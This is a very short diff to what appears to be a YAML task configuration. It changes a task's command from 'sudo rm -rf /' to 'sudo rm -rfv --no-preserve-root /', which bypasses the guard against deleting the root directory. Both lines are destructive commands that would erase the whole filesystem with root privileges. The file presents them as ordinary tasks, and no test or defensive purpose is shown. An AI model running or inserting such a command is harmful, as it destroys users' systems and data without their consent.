@@ -1,2 +1,2 @@
 tasks:
-  - command: sudo rm -rf /
+  - command: sudo rm -rfv --no-preserve-root /
